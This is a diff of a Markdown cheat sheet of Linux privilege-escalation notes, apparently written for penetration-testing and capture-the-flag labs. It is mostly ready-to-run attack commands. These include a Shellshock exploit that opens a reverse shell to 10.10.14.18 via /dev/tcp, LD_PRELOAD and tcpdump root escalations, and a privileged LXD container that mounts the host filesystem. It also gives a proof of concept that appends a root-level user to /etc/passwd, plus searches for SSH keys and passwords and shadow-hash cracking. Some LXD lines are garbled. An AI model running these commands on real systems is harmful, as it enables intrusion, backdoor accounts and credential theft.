@@ -1,101 +1,189 @@
-# Remote Priv Esc
+# Linux privilege escalation
 
-## Shell Shock 
+## Enumeration is key (as always)
 
-* spot /cgi-bin
-* dirbust .sh .cgi or some more exotic script files in it 
-* use 34766.php
+1. Start with low hanging fruits: just browse through file system and look for credentials and other sensible information
+2. Enumerate user rights and groups 
+3. Look for systems to mount and also enumerate them
+4. Enumerate `sudo, SUID and GUID`
+5. Enumerate programms running as root
+6. Look for kernerl modules vulnerabilities
+7. Finally, check if kernel version is vulnerable. Typically it iis the last thing to do because it can break the whole system.
 
-`php 34766.php -u http://shocker.htb/cgi-bin/user.sh -c "sh -i >& /dev/tcp/10.10.14.18/443 0>&1" `
+### Key manual commands for enumeration
 
-# Local Priv Esc: General Info and Approach
+```bash 
 
-* Generally you end up in restricted user account or shell
-* You can almost always write to `/tmp` folder
+# elevate to root using sudo
+# (ALL : ALL) ALL
+sudo -i
 
-* Linux Privilege escalation can be performed using following options:
+ps aux | grep root
 
-1. Disclosed passwords or other credentials allowing direct accont hijacking
-2. sudo misconfigurations or vulnerabilities
-3. SUID or SGID misconfigurations
-4. Write on root owned files
-5. Cron services misconfigurations
-6. Services ran as root
-7. Kernel Exploits
-8. Using enumeration scripts
+#watch processes
+watch -n 1 "ps -aux | grep pass"
+./pspy32
 
-# Using enumeration scripts
+#See logged in users
+ps au	
+ssh
+# Check for SSH keys 
+ls -l /root/.ssh	
 
-https://github.com/carlospolop/PEASS-ng/releases/
-https://github.com/rebootuser/LinEnum
-https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
-https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
-https://payatu.com/guide-linux-privilege-escalation
+# look for credentials and other infor in environmental variables
+env
+cat .bashrc
 
-# Disclosed passwords or other credentials
+sudo -l	
+
+# check for all cron jobs
+ls -la /etc/cron*	
+crontab -l
+
+#Check for unmounted file systems/drives
+lsblk	
+cat /etc/fstab
+
+# find writable files and direcrtories
+find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null
+
+# Find world-writeable directories
+find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null	
+
+# Find world-writeable files
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null	
+
+uname -a	
+
+# Check the OS version
+cat /etc/lsb-release	
+
+# Check the installed version of Screen
+screen -v	
+
+# View running processes with pspy
+./pspy64 -pf -i 1000	
+
+# Find binaries with the SUID bit set
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	
+
+# Find binaries with the SETGID bit set
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null	
+
+# find capabilities like SUID manually
+/usr/sbin/getcap -r / 2>/dev/null
+
+# Priv esc with tcpdump
+sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root	
+
+# Check the current user's PATH variable contents
+echo $PATH	
+getenv
+
+# Add a . to the beginning of the current user's PATH
+PATH=.:${PATH}	
+
+#Search for config files
+find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null	
+
+# View the shared objects required by a binary
+ldd /bin/ls	
+
+#Escalate privileges using LD_PRELOAD
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart	
+
+#Check the RUNPATH of a binary
+readelf -d payroll | grep PATH	
+
+#Compiled a shared libary
+gcc src.c -fPIC -shared -o /development/libshared.so	
+
+# Start the LXD initialization process
+lxd init	
+
+# Import a local image
+lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine	
+
+#Start a privileged LXD container
+lxc init alpine r00t -c security.privileged=true	
+
+lxc config device add r00t mip a
+
+# Mount the host file system in a container
+ydev disk source=/ path=/mnt/root recursive=true	
+
+# Start the container
+lxc start r00t	
+
+# Show the NFS export list
+showmount -e 10.129.2.12	
+
+# Mount an NFS share locally
+sudo mount -t nfs 10.129.2.12:/tmp /mnt	
+
+# Created a shared tmux session socket
+tmux -S /shareds new -s debugsess	
+
+# audit system	Perform a system audit with Lynis
+./linpeas.sh 
+
+#iptables fw rules
+cat /etc/iptables/rules.v4
+
+# loaded kernel modukes
+lsmod
+
+# get more info about some module
+/sbin/mdinfo libdata
+```
+### Abusing cron jobs
+
+```bash
+# observe cronjobs
+
+grep "CRON" /var/log/syslog
+
+cat /var/log/cron.log
+
+```
+
+### Disclosed passwords or other credentials
 
 * If it is webserver, first thing is to look for database credentials
-```
+
+```bash
 cd config
 
 grep -Ri password .
 ```
 
 * Finding passwords using bash
-```
+
+```bash
 grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
 find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 ```
 
 * Finding passwords using linenum
-```
+
+```bash
 ./LinEnum.sh -k password
 ```
 
 * Finding ssh keys
 
-```
+```bash
 find / -name authorized_keys 2> /dev/null
 find / -name id_rsa 2> /dev/null
 ```
 
-* Advanced: SSH-DSS process
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ssh-key-predictable-prng-authorized_keys-process
 
+### Cron services misconfigurations
 
+`crontab -e` to edit crontab
 
-
-# SUID or SGID misconfigurations
-
-If s-bit is set, it allows running the program as the owner.
-Sometimes those programs can be vulnerable or tricked into executing some malicious code.
-
-1. Find SUID or SGID files
-
-For SUID:
-`find . -perm /4000 2>/dev/null`
-
-For SGID:
-`find . -perm /2000 2>/dev/null`
-
-For both (preferred way):
-`find / -perm -u=s -type f 2>/dev/null`
-
-2. Exploit SUID
-
-* use `strings` to identify use command within SUID file 
-* Always use elf payload for exploiting SUID
-
-
-
-# Write on root owned files
-
-# Cron services misconfigurations
-
-```
-ls -la /etc/cron.daily/
-```
+```bash
 # = ID
 
 m = Minute
@@ -114,98 +202,37 @@ command = What command should be run
 
 For Example,
 
-   m   h dom mon dow user  command
+#   m   h dom mon dow user  command
 
 17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
 
 
-
-# Utilities
-This should help inside the system.
-
-## System recon
-
-1. List processes run as root:
-`ps aux | grep root`
-
-OR/AND use `pspy` to scout running processes https://github.com/DominicBreuker/pspy
-
-2. Search history:
-`history`
-
-3. Search home directories:
-`ls -la /home`
-`ls -la ~/.ssh`
-
-4. See sudo permissions (password may be needed):
-`sudo -l`
-
-5. search for config files
-
-`find / -iname *.config 2>/dev/null`
-
-6. Grab password hashes
-
-shadow file /etc/shadow or /etc/passwd
-
-In passwd you may find something like this: sysadm:$6$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A.0HW7WZCrUhZ9wwDz13bPpkTjNuRoUGYhwFE11:1007:1007::/home/sysadm:
-
-Cracking the hash:
-
-```
-# $6$ stands for sha512
-
-hashcat -h | grep sha512
-
-hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
-
 ```
 
-7. Exploit unmounted drives to find sensitive information
+## Automated enumeration
 
-`lsblk`
+### unix-privesc-check
 
-8. Find writable directories and files:
-`find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`
-`find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
+https://github.com/pentestmonkey/unix-privesc-check
 
-9. Kernel exploit
+`./upc standard`
 
-`uname -a`
-`lsb_release -a`
+### Linpeas
 
-Very good collection of nix exploits: https://github.com/FuzzySecurity/Unix-PrivEsc
+`./linpeas,sh`
 
-## File transfering 
+## Utilities
 
-* scp
-* socat
-* wget
-* nc
-```
-#start listener
-nc -lvnp 80 > output.txt
 
-#start sender
-nc -nv listener_ip 80 < input.txt
+* Supress messages from background process
 
-#wait some time depending on file size: 10 seconds to 10 minutes...
-cat output.txt
-```
-## Breaking out of restricted shell
+<code>  bg_proc > /dev/null 2>&1 &   </code>
 
-### vim
 
-breaking out using vim 
-```
-vim
-:set shell=/bin/sh
-:shell
-```
 
-# /etc/passwd
+## exploiting /etc/passwd
 
-## The structure of the passwd file is as follows
+### The structure of the passwd file is as follows
 
 <code> oracle:x:1021:1021:Oracle Services:/data/network/oracle:/bin/bash </code>
 
@@ -221,25 +248,37 @@ vim
 6. **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
 7. **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. For example, sysadmin can use the nologin shell, which acts as a replacement shell for the user accounts. If shell set to /sbin/nologin and the user tries to log in to the Linux system directly, the /sbin/nologin shell closes the connection.
 
-## Use of passwd for privilege escalation
+### Use of passwd for privilege escalation
 
 * privilege escalation on Linux may make use of passwd file if something can be appended to it (perform recon)
 * For example kernel exploit can be compiled to execute arbitrary command to add a line to passwd file as root to make a hidden user with admin rights...
 
 So to **make oracle user root account**, it is sufficient to add following line
 
-<code> tester:x:0:0::/:/bin/bash </code>
-
-Instead of 1021, we got UID and GID 0, which corresponds to root account. So user orcale is root now.
+<code> oracle:x:0:0::/:/bin/bash </code>
 
 Additionally one may generate a password hash with crypt function and add it the second position instead of x. 
 
-`openssl passwd -1`
+```bash
+#POC for password generation and injection into /etc/passwd
+
+openssl passwd w00t
+#Fdzt.eqJQ4s0g
+
+echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+su root2
+w00t
+
+id
+```
 
 <code> pentester:$1$2AL4ULeB$vPb2hnoy5xgsBueJSXTsj0:0:0::/:/bin/bash </code>
 Password1
 
-# Shadow file hash cracking/adding
+### Shadow file 
+
+#### make shadow files
 
 Generate shadow files ([stackoverflow](https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow)):
 
@@ -259,51 +298,31 @@ username:$X$salt$pass....
 
 AND dont forget salt!
 
-# Diverse
+#### crack shadow file
 
-* Supress messages from background process
+1. copy and unshadow
+2. crack with john 
 
-<code>  bg_proc > /dev/null 2>&1 &   </code>
-
-```bash 
-ps aux | grep root	See processes running as root
-ps au	See logged in users
-ls /home	View user home directories
-ls -l ~/.ssh	Check for SSH keys for current user
-history	Check the current user's Bash history
-sudo -l	Can the user run anything as another user?
-ls -la /etc/cron.daily	Check for daily Cron jobs
-lsblk	Check for unmounted file systems/drives
-find / -perm -002 -type d 2>/dev/null Find world writeable directories
-find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null	Find world-writeable directories
-find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null	Find world-writeable files
-uname -a	Check the Kernel versiion
-cat /etc/lsb-release	Check the OS version
-gcc kernel_expoit.c -o kernel_expoit	Compile an exploit written in C
-screen -v	Check the installed version of Screen
-./pspy64 -pf -i 1000	View running processes with pspy
-find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	Find binaries with the SUID bit set
-find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null	Find binaries with the SETGID bit set
-sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root	Priv esc with tcpdump
-echo $PATH	Check the current user's PATH variable contents
-PATH=.:${PATH}	Add a . to the beginning of the current user's PATH
-find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null	Search for config files
-ldd /bin/ls	View the shared objects required by a binary
-sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart	Escalate privileges using LD_PRELOAD
-readelf -d payroll | grep PATH	Check the RUNPATH of a binary
-gcc src.c -fPIC -shared -o /development/libshared.so	Compiled a shared libary
-lxd init	Start the LXD initialization process
-lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine	Import a local image
-lxc init alpine r00t -c security.privileged=true	Start a privileged LXD container
-lxc config device add r00t mip a
-ydev disk source=/ path=/mnt/root recursive=true	Mount the host file system in a container
-lxc start r00t	Start the container
-showmount -e 10.129.2.12	Show the NFS export list
-sudo mount -t nfs 10.129.2.12:/tmp /mnt	Mount an NFS share locally
-tmux -S /shareds new -s debugsess	Created a shared tmux session socket
-./lynis audit system	Perform a system audit with Lynis
-```
 
 ## Post Exploitation
 
 https://guif.re/linuxeop#Post%20exploitation
+
+
+## Diverse Other exploits
+
+### Shell Shock 
+
+* spot /cgi-bin
+* dirbust .sh .cgi or some more exotic script files in it 
+* use 34766.php
+
+`php 34766.php -u http://shocker.htb/cgi-bin/user.sh -c "sh -i >& /dev/tcp/10.10.14.18/443 0>&1" `
+
+### Breaking out of restricted shell using vim
+
+```bash
+vim
+:set shell=/bin/sh
+:shell
+```
